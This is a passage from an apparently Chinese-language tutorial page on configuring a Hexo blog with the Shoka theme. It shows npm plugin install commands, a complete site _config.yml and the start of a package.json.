install hexo-algoliasearch --save\n</code></pre>\n<p><strong>hexo-symbols-count-time</strong></p>\n<pre><code>npm install hexo-symbols-count-time\n</code></pre>\n<p><strong>hexo-feed</strong></p>\n<pre><code>npm install hexo-feed --save-dev\n</code></pre>\n<h1 id=\"根目录配置文件\"><a class=\"anchor\" href=\"#根目录配置文件\">#</a> 根目录配置文件</h1>\n<p>在尝试中搞懂配置规则，可以将 <code>Project/themes/shoka/example</code>  目录下的文件 copy 到 Hexo 博客项目的根目录实现一键配置，加速对该主题建站模式的理解</p>\n<h2 id=\"_configyml\"><a class=\"anchor\" href=\"#_configyml\">#</a> _config.yml</h2>\n<p>站点配置文件</p>\n<p>其中对 <code>category_map</code>  的类别设置其实无关紧要，博客中的类别需要在书写 markdown 时对其进行设置</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Hexo Configuration</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">## Docs: http://hexo.io/docs/configuration.html</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">## Source: https://github.com/hexojs/hexo/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># Site</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> Hexo</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token key atrule\">subtitle</span><span class=\"token punctuation\">:</span> subtitle</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token key atrule\">description</span><span class=\"token punctuation\">:</span> 描述123</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token key atrule\">keywords</span><span class=\"token punctuation\">:</span> 关键词1<span class=\"token punctuation\">,</span>关键词2 <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token key atrule\">author</span><span class=\"token punctuation\">:</span> John Doe</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token key atrule\">language</span><span class=\"token punctuation\">:</span> zh<span class=\"token punctuation\">-</span>CN <span class=\"token comment\"># 这里只可以选 zh-CN、zh-HK、zh-TW、ja、en 这几个格式</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token key atrule\">timezone</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Asia/Shanghai'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># URL</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span>//yoursite.com</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token key atrule\">root</span><span class=\"token punctuation\">:</span> /</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token key atrule\">permalink</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>title/ <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token key atrule\">permalink_defaults</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># Directory</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token key atrule\">source_dir</span><span class=\"token punctuation\">:</span> source</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token key atrule\">public_dir</span><span class=\"token punctuation\">:</span> public</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token key atrule\">tag_dir</span><span class=\"token punctuation\">:</span> tags</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token key atrule\">archive_dir</span><span class=\"token punctuation\">:</span> archives</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token key atrule\">category_dir</span><span class=\"token punctuation\">:</span> categories</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token key atrule\">code_dir</span><span class=\"token punctuation\">:</span> downloads/code</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token key atrule\">i18n_dir</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>lang</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token key atrule\">skip_render</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># Writing</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token key atrule\">new_post_name</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>title.md <span class=\"token comment\"># File name of new posts</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token key atrule\">default_layout</span><span class=\"token punctuation\">:</span> post</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token key atrule\">titlecase</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># Transform title into titlecase</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token key atrule\">external_link</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># Open external links in new tab</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token key atrule\">field</span><span class=\"token punctuation\">:</span> site <span class=\"token comment\"># Apply to the whole site</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token key atrule\">filename_case</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token key atrule\">render_drafts</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token key atrule\">post_asset_folder</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token key atrule\">relative_link</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token key atrule\">future</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token key atrule\">highlight</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token key atrule\">auto_detect</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token key atrule\">prismjs</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># Category &amp; Tag</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token key atrule\">default_category</span><span class=\"token punctuation\">:</span> uncategorized</pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token key atrule\">category_map</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token key atrule\">计算机科学</span><span class=\"token punctuation\">:</span> computer<span class=\"token punctuation\">-</span>science</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token key atrule\">Java</span><span class=\"token punctuation\">:</span> java</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token key atrule\">二进制杂谈</span><span class=\"token punctuation\">:</span> note</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token key atrule\">零基础学Java语言-浙江大学-翁恺</span><span class=\"token punctuation\">:</span> course<span class=\"token punctuation\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token key atrule\">Theme Shoka Documentation</span><span class=\"token punctuation\">:</span> theme<span class=\"token punctuation\">-</span>shoka<span class=\"token punctuation\">-</span>doc</pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token key atrule\">tag_map</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># Date / Time format</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">## Hexo uses Moment.js to parse and display date</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">## You can customize the date format as defined in</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">## http://momentjs.com/docs/#/displaying/format/</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token key atrule\">date_format</span><span class=\"token punctuation\">:</span> YYYY<span class=\"token punctuation\">-</span>MM<span class=\"token punctuation\">-</span>DD</pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token key atrule\">time_format</span><span class=\"token punctuation\">:</span> HH<span class=\"token punctuation\">:</span>mm<span class=\"token punctuation\">:</span>ss</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># Pagination</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">## Set per_page to 0 to disable pagination</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token key atrule\">per_page</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token key atrule\">pagination_dir</span><span class=\"token punctuation\">:</span> page</pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\"># Extensions</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">## Plugins: http://hexo.io/plugins/</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">## Themes: http://hexo.io/themes/</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> shoka <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token key atrule\">autoprefixer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">'*.min.css'</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token key atrule\">markdown</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token key atrule\">render</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 渲染器设置</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 过滤 HTML 标签</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token key atrule\">xhtmlOut</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 使用 '/' 来闭合单标签 （比如 &lt;br />）。</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token key atrule\">breaks</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 转换段落里的 '\\n' 到 &lt;br>。</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token key atrule\">linkify</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 将类似 URL 的文本自动转换为链接。</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token key atrule\">typographer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token key atrule\">quotes</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'“”‘’'</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>  <span class=\"token key atrule\">plugins</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># markdown-it 插件设置</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>toc<span class=\"token punctuation\">-</span>and<span class=\"token punctuation\">-</span>anchor</pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 文章目录以及锚点应用的 class 名称，shoka 主题必须设置成这样</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>          <span class=\"token key atrule\">tocClassName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'toc'</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>          <span class=\"token key atrule\">anchorClassName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'anchor'</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>multimd<span class=\"token punctuation\">-</span>table</pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>          <span class=\"token key atrule\">multiline</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>          <span class=\"token key atrule\">rowspan</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>          <span class=\"token key atrule\">headerless</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> ./markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>furigana</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>          <span class=\"token key atrule\">fallbackParens</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"()\"</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> ./markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>spoiler</pre></td></tr><tr><td data-num=\"114\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>          <span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"你知道得太多了\"</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre></pre></td></tr><tr><td data-num=\"118\"></td><td><pre><span class=\"token key atrule\">minify</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/json.ejs'</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/atom.ejs'</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/rss.ejs'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  <span class=\"token key atrule\">css</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/*.min.css'</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token key atrule\">js</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token key atrule\">stamp</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token key atrule\">mangle</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>      <span class=\"token key atrule\">toplevel</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token key atrule\">compress</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>      <span class=\"token punctuation\">-</span> <span class=\"token string\">'**/*.min.js'</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre><span class=\"token comment\"># algolia:</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token comment\">#   appId:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre><span class=\"token comment\">#   apiKey:</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token comment\">#   adminApiKey:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre><span class=\"token comment\">#   chunkSize: 5000</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token comment\">#   indexName:</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre><span class=\"token comment\">#   fields:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token comment\">#     - title #必须配置</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre><span class=\"token comment\">#     - path #必须配置</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token comment\">#     - categories #推荐配置</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre><span class=\"token comment\">#     - content:strip:truncate,0,4000</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token comment\">#     - gallery</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre><span class=\"token comment\">#     - photos</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre><span class=\"token comment\">#     - tags</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token key atrule\">feed</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    <span class=\"token key atrule\">limit</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    <span class=\"token key atrule\">order_by</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"-date\"</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    <span class=\"token key atrule\">tag_dir</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    <span class=\"token key atrule\">category_dir</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token key atrule\">rss</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/rss.ejs\"</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rss.xml\"</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    <span class=\"token key atrule\">atom</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/atom.ejs\"</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"atom.xml\"</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token key atrule\">jsonFeed</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>        <span class=\"token key atrule\">template</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"themes/shoka/layout/_alternate/json.ejs\"</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>        <span class=\"token key atrule\">output</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"feed.json\"</span></pre></td></tr></table></figure><h2 id=\"packagejson\"><a class=\"anchor\" href=\"#packagejson\">#</a> package.json</h2>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo-site\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token key atrule\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"0.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token key atrule\">\"private\"</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token key atrule\">\"scripts\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token key atrule\">\"build\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo generate\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token key atrule\">\"clean\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo clean\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token key atrule\">\"deploy\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo deploy\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token key atrule\">\"server\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"hexo server\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token key atrule\">\"hexo\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token key atrule\">\"version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"5.4.2\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token key atrule\">\"dependencies\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token key atrule\">\"hexo\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^5.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-algoliasearch\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^0.4.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-autoprefixer\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-deployer-git\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^2.1.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-feed\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-generator-category\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-generator-tag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"^1.0.0\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token key atrule\">\"hexo-pagination\"</span><span class=\"token 